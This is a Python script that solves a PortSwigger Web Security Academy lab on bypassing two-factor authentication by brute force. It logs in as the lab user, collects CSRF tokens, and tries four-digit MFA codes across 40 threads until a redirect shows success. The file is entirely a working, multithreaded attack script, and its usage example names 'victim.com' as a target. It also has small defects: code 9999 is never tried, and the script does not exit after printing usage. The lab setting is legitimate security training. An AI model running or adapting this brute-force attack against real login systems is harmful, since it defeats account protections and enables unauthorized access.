# https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack
# Brute forcing MFA

import urllib3
import sys
import requests
from bs4 import BeautifulSoup
import threading
from queue import Queue

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

used_codes = set()
codes_queue = Queue()

def bruteForce(url, thread_num):

    stop_flag = False
    username = "carlos"
    password = "montoya"

    # print("[ + ] Generating %s thread request for user %s...\n" % (thread_num, username))
    # print("[+] Thread %d: Generating request for user %s...\n" % (thread_num, username))

    loginUrl = url + "/login"
    mfaUrl = url + "/login2"

    csrf_value = ""

    while not codes_queue.empty() and not stop_flag:
        i = codes_queue.get()

    # for i in range(9999):
        
        r = requests.session()

        rLogin = r.get(loginUrl, verify=False, proxies=proxies)

        soup1 = BeautifulSoup(rLogin.text, 'html.parser')
        csrf_value1 = soup1.find('input', {'name': 'csrf'}).get('value')

        loginParams = { 
            "csrf": csrf_value1,
            "username": username, 
            "password": password
        }

        # print(csrf_value)

        rLogin = r.post(loginUrl, verify=False, proxies=proxies, data=loginParams)

        padded_number = str(i).zfill(4)

        rMFA = r.get(mfaUrl, verify=False, proxies=proxies)

        soup2 = BeautifulSoup(rMFA.text, 'html.parser')
        csrf_value2 = soup2.find('input', {'name': 'csrf'}).get('value')

        params = {
            "csrf": csrf_value2,
            "mfa-code": padded_number
        }

        if padded_number not in used_codes:
            used_codes.add(padded_number)

        rMFA = r.post(mfaUrl, verify=False, proxies=proxies, data=params, allow_redirects=False)

        sys.stdout.write('\r' + "Brute Forcing MFA Code: " + padded_number)
        print(" "*50, end='\r', flush=True)

        if rMFA.status_code == 302:
            stop_flag = True
            mfaCode = padded_number
            print("\n\n------------------------------------")
            print("MFA found: " + mfaCode)
            print("------------------------------------")
            sys.exit()
            # break
 
def main():
    if len(sys.argv) != 2:
        print("Usage: %s <URL>" % sys.argv[0])
        print("Example: %s https://victim.com" % sys.argv[0])

    url = sys.argv[1]
    # bruteForce(url)

    for i in range(9999):
        codes_queue.put(i)

    # Number of threads you want to create
    num_threads = 40

    # Create and start threads
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=bruteForce, args=(url, i + 1))
        threads.append(thread)
        thread.start()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

    print("All threads have finished.")

if __name__ == "__main__":
    main() 
